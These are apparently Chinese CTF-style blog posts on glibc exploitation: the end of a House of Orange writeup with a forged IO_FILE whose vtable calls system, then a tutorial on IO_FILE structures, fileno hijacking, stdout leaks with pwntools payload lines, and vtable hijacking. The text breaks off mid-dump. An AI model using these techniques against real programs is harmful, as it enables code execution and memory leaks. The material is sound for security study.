进行unsortedbin遍历时，将会进入进入smallbin-0x60 */</span></span><br><span class="line">    <span class="comment">/* 将会被当做是IO_FILE 结构体 */</span></span><br><span class="line"><span class="number">0x55e7fa48d520</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fd8c195c510</span> <span class="comment">// unsortedbin attack</span></span><br><span class="line">    <span class="comment">/* 向_IO_list_all中写入main_arean+88 */</span></span><br><span class="line">    <span class="comment">/* 如果把main_arean+88当成一个IO_FILE结构体 */</span></span><br><span class="line">    <span class="comment">/* 那么struct _IO_FILE *_chain指针的地址为main_arena+0xc0(88+0x68) */</span></span><br><span class="line">    <span class="comment">/* 而main_arena+0xc0中装有smallbin-0x60的地址 */</span></span><br><span class="line">    <span class="comment">/* 在smallbin-0x60中伪造数据,就是在伪造IO_FILE结构体 */</span></span><br><span class="line"><span class="number">0x55e7fa48d530</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000001</span> </span><br><span class="line">    <span class="comment">/* _IO_write_base and _IO_write_ptr */</span></span><br><span class="line"><span class="number">0x55e7fa48d540</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d550</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d560</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d570</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d580</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d590</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d5a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d5b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d5c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d5d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">/* __pad5 and _mode(修改_mode为“0”非常方便) */</span></span><br><span class="line"><span class="number">0x55e7fa48d5e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000055e7fa48d5e8</span> <span class="comment">// vtable_start</span></span><br><span class="line">    <span class="comment">/* fake_vtable(IO_2_1_stdin+216) */</span></span><br><span class="line"><span class="number">0x55e7fa48d5f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d600</span>:	<span class="number">0x00007fd8c15dd380</span>	<span class="number">0x0000000000000000</span> <span class="comment">// system(vtable+32)</span></span><br><span class="line">    <span class="comment">/* vtable+32就是__overflow,劫持overflow为system(整个结构体作为overflow的参数) */</span></span><br><span class="line"><span class="number">0x55e7fa48d610</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d620</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d630</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>现在简单解释一下程序为什么会调用 overflow：（这是FSOP的内容）</p>
<p>因为我们修改了 unsortedbin 的结构，使其不合法了，导致程序触发异常并执行“malloc_printerr”，从而调用了 <code>_IO_flush_all_lockp</code> ，最后调用 <code>_IO_OVERFLOW</code>（虚表调用，但虚表已被伪造）</p>
<p><strong>house of orange 小结（2.23-64位）</strong></p>
<p>house of orange 真的是特别精妙的漏洞利用，这里简述一下它的过程</p>
<ul>
<li>利用堆溢出修改 top chunk-&gt;size 为“0xf81”</li>
<li>申请一个较大的 chunk，把 top chunk 放入unsortedbin</li>
<li>申请“0x400”进行泄露</li>
<li>再次溢出，修改 unsorted chunk-&gt;size 为“0x60”，在遍历 unsortedbin 之时可以被放入 smallbin</li>
<li>利用 unsortedbin attack 向 IO_list_all 中写入 main_arena+88（被当成一个IO_FILE结构体）</li>
<li>在大小为“0x60”的 smallbin 中伪造IO_FILE结构体，劫持虚表到可控区域</li>
<li>在 <code>_IO_OVERFLOW</code> 的位置写入“system”</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/16/IO_FILE%20pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/16/IO_FILE%20pwn/" class="post-title-link" itemprop="url">IO_FILE pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-16 18:44:44" itemprop="dateCreated datePublished" datetime="2022-03-16T18:44:44+08:00">2022-03-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-09 18:35:28" itemprop="dateModified" datetime="2022-12-09T18:35:28+08:00">2022-12-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="IO-FILE-pwn"><a href="#IO-FILE-pwn" class="headerlink" title="IO_FILE pwn"></a>IO_FILE pwn</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流</p>
<p>FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中，然后以链表的形式串联起来，但系统一开始会自动创建的三个文件即 stdin、stdout、stderr，它们是在libc上</p>
<p>先借 libc-2.23 说明一下 FILE 结构：</p>
<p>在 libc-2.23 版本中，有个全局变量<code>_IO_list_all</code>，该变量指向了FILE链表的头部 </p>
<p>首先认识一个结构体<code>_IO_FILE_plus</code>，所有 FILE 文件结构都是这样的一个结构体，整个结构体如下代码所示，其中又包括了两个重要的结构体<code>_IO_FILE</code>和<code>IO_jump_t</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    _IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 GDB 中输入以下命令可以打印 <code>_IO_list_all</code> ：（这里通过在前面加上结构体类型可以详细的打印其内存数据信息）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x*(struct _IO_FILE_plus*)_IO_list_all</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0xfbad2086</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x7ffff7dd2620</span>, <span class="comment">// 指向下一个链表节点(stderr的下一个:stdout)</span></span><br><span class="line">    _fileno = <span class="number">0x2</span>, <span class="comment">// fileno值为2(标准错误流的文件描述符就是&#x27;2&#x27;)</span></span><br><span class="line">    _flags2 = <span class="number">0x0</span>,</span><br><span class="line">    _old_offset = <span class="number">0xffffffffffffffff</span>,</span><br><span class="line">    _cur_column = <span class="number">0x0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>,</span><br><span class="line">    _shortbuf = &#123;<span class="number">0x0</span>&#125;,</span><br><span class="line">    _lock = <span class="number">0x7ffff7dd3770</span>,</span><br><span class="line">    _offset = <span class="number">0xffffffffffffffff</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x7ffff7dd1660</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0x0</span>,</span><br><span class="line">    _mode = <span class="number">0x0</span>,</span><br><span class="line">    _unused2 = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">20</span> times&gt;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7ffff7dd06e0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就是 <code>_IO_list_all</code> 变量， <strong>其指向 FILE 链表的头部</strong> ，结合上面的结构体可知，file对应的就是 <code>_IO_FILE</code> 结构类型，vtable 对应的就是 <code>_IO_jump_t</code> 类型 </p>
<p>在没有创建其它文件结构时， <code>_IO_list_all</code> 指向stderr，然后依次是 stdout 和 stdin（可以通过打印 <code>_chain</code> 进行查看）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x _IO_list_all</span><br><span class="line">$<span class="number">2</span> = <span class="number">0x7ffff7dd2540</span></span><br><span class="line">pwndbg&gt; p/x <span class="built_in">stderr</span></span><br><span class="line">$<span class="number">3</span> = <span class="number">0x7ffff7dd2540</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; p/x _IO_list_all.file._chain</span><br><span class="line">$<span class="number">4</span> = <span class="number">0x7ffff7dd2620</span></span><br><span class="line">pwndbg&gt; p/x <span class="built_in">stdout</span></span><br><span class="line">$<span class="number">5</span> = <span class="number">0x7ffff7dd2620</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7dd2520</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7dd2520</span> (_IO_list_all) —▸ <span class="number">0x7ffff7dd2540</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7dd2540</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7dd2540</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7dd2548</span> (_IO_2_1_stderr_+<span class="number">8</span>) ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7dd2620</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7dd2620</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2084</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7dd2628</span> (_IO_2_1_stdout_+<span class="number">8</span>) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>由于 <code>_IO_FILE_plus</code> 中只是存储了 vtable 的指针，并没有存储详细的结构信息，所以这里我们进一步打印一下 vtable ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_jump_t*)_IO_list_all.vtable </span><br><span class="line">$<span class="number">6</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7a869d0</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7a87740</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7ffff7a874b0</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7ffff7a88610</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7ffff7a89990</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7a861f0</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7ffff7a85ed0</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7ffff7a854d0</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7ffff7a88a10</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7ffff7a85440</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7ffff7a85380</span> &lt;_IO_new_file_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7ffff7a7a190</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7ffff7a861b0</span> &lt;__GI__IO_file_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7ffff7a85b80</span> &lt;_IO_new_file_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7ffff7a85980</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7ffff7a85350</span> &lt;__GI__IO_file_close&gt;,</span><br><span class="line">  __stat = <span class="number">0x7ffff7a85b70</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7a89b00</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7a89b10</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="fileno-劫持"><a href="#fileno-劫持" class="headerlink" title="fileno 劫持"></a>fileno 劫持</h2><p>这个利用比较局限，一般在有“open”的程序中使用</p>
<p>利用的原理很简单，通过上面的分析，我们可以看到 fileno 的值就是文件描述符，位于 stdin 文件结构开头0x70偏移处，在漏洞利用中可以通过 <strong>修改 stdin 的 fileno 值来重定位需要读取的文件</strong> （原本是“0”，从标准输入中读取，现在改为“fd”，从目标文件中读取），接下来类似于 read 之类的函数都会从目标文件中进行读取（修改为“flag”的描述符，就可以读取“flag”）</p>
<h2 id="IO-2-1-stdout-leak"><a href="#IO-2-1-stdout-leak" class="headerlink" title="IO_2_1_stdout leak"></a>IO_2_1_stdout leak</h2><p>可以在没有打印模块的情况下 leak libc_base，通常与 house of roman 结合</p>
<p>这个攻击需要用到结构体 <code>_IO_FILE</code> ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;           </span><br><span class="line"><span class="comment">/* 文件标志，简单的说：像puts一类的输入输出函数要想正确的打印信息就需要正确设置该字段 */</span> </span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;    <span class="comment">/* 始终指向缓冲区中已被用户读走的字符的下一个 */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;    <span class="comment">/* 指向&quot;读缓冲区&quot;的末尾 */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;    <span class="comment">/* 指向&quot;读缓冲区&quot; */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;    <span class="comment">/* 指向&quot;写缓冲区&quot; */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;    <span class="comment">/* 始终指向缓冲区中已被用户写入的字符的下一个 */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;    <span class="comment">/* 指向&quot;写缓冲区&quot;的末尾*/</span></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们一般将堆块分配到 stdout 指针处存储的 <code>_IO_2_1_stdout_</code> 处：（这里是一个 <code>IO_FILE</code> 结构体）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="built_in">stdout</span> </span><br><span class="line">$<span class="number">1</span> = (struct _IO_FILE *) <span class="number">0x7ffff7dd0760</span> &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; ptype <span class="built_in">stdout</span></span><br><span class="line">type = struct _IO_FILE &#123;</span><br><span class="line">    <span class="keyword">int</span> _flags;</span><br><span class="line">    <span class="keyword">char</span> *_IO_read_ptr;</span><br><span class="line">    <span class="keyword">char</span> *_IO_read_end;</span><br><span class="line">    <span class="keyword">char</span> *_IO_read_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_write_base;  <span class="comment">//  本质上是通过修改这个结构题泄露</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_write_ptr;   <span class="comment">//  这两个指针地址之间的内容</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_write_end;</span><br><span class="line">    <span class="keyword">char</span> *_IO_buf_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_buf_end;</span><br><span class="line">    <span class="keyword">char</span> *_IO_save_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_backup_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_save_end;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">    <span class="keyword">int</span> _fileno;</span><br><span class="line">    <span class="keyword">int</span> _flags2;</span><br><span class="line">    <span class="keyword">__off_t</span> _old_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">    <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">    _IO_lock_t *_lock;</span><br><span class="line">    <span class="keyword">__off64_t</span> _offset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line">    <span class="keyword">size_t</span> __pad5;</span><br><span class="line">    <span class="keyword">int</span> _mode;</span><br><span class="line">    <span class="keyword">char</span> _unused2[<span class="number">20</span>];</span><br><span class="line">&#125; *</span><br></pre></td></tr></table></figure>
<p>修改其 <code>_flags</code> 为 “0xfbad1800”（或者“0xfbad3887”），将后面三个read指针置空，将 <code>_IO_write_base</code> 处的第一个字节改为0x58（或者“0”），后面的 <code>_IO_write_ptr</code> 和 <code>_IO_write_end</code> 保持不变（该flags这样设置只是针对puts函数，其余打印函数略有不同）</p>
<p>当程序遇到puts函数时就会打印 <code>_IO_write_base</code> 到 <code>_IO_write_ptr</code> 之间的内容</p>
<ul>
<li>泄露 <code>_IO_file_jumps</code> 的写法：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&quot;\x58&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>泄露 <code>_IO_2_1_stdin_</code> 的写法：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad3887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h2 id="vtable-劫持"><a href="#vtable-劫持" class="headerlink" title="vtable 劫持"></a>vtable 劫持</h2><p>如果程序开了 Full RELRO ，禁用了 hook ，并且没有法控制栈，这时就要考虑 vtable 劫持了</p>
<p>vtable是 <code>_IO_FILE_plus</code> 结构体里的一个字段，是一个函数表指针，里面存储着许多和 IO 相关的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_jump_t*)_IO_list_all.vtable</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7e68510</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7e69320</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7ffff7e68fc0</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7ffff7e6a4c0</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7ffff7e6bc90</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7e67b20</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7ffff7e677a0</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7ffff7e66d90</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7ffff7e6ac30</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7ffff7e66a60</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7ffff7e668f0</span> &lt;_IO_new_file_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7ffff7e5a600</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7ffff7e67e50</span> &lt;__GI__IO_file_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7ffff7e67390</span> &lt;_IO_new_file_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7ffff7e66b30</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7ffff7e66a50</span> &lt;__GI__IO_file_close&gt;,</span><br><span class="line">  __stat = <span class="number">0x7ffff7e67370</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7e6be20</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7e6be30</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数表中有19个函数，分别完成IO相关的功能，由IO函数调用，如 <code>fwrite</code> 最终会调用 <code>__write</code> 函数、 <code>fread</code> 会调用 <code>__doallocate</code> 来分配IO缓冲区等</p>
<p>vtable劫持的原理是：如果能够控制 FILE 结构体（一般是控制“stdin”的 <code>_IO_FILE_plus</code> 结构体），实现对 vtable 指针的修改，使得 vtable 指向可控的内存（一般在这片内存的各个区域中，全部写入“one_gadget”），在该内存中构造好 vtable，再通过调用相应IO函数，触发 vtable 函数的调用，即可劫持程序执行流（劫持最关键的点在于修改 <code>_IO_FILE_plus</code> 结构体的 vtable 指针）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f754337997d</span>+<span class="number">3</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f7543379980</span> (_IO_2_1_stdin_+<span class="number">160</span>) —▸ <span class="number">0x7f75433799c0</span> (_IO_wide_data_0) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f7543379988</span> (_IO_2_1_stdin_+<span class="number">168</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f75433799a0</span> (_IO_2_1_stdin_+<span class="number">192</span>) ◂— <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f75433799a8</span> (_IO_2_1_stdin_+<span class="number">200</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span 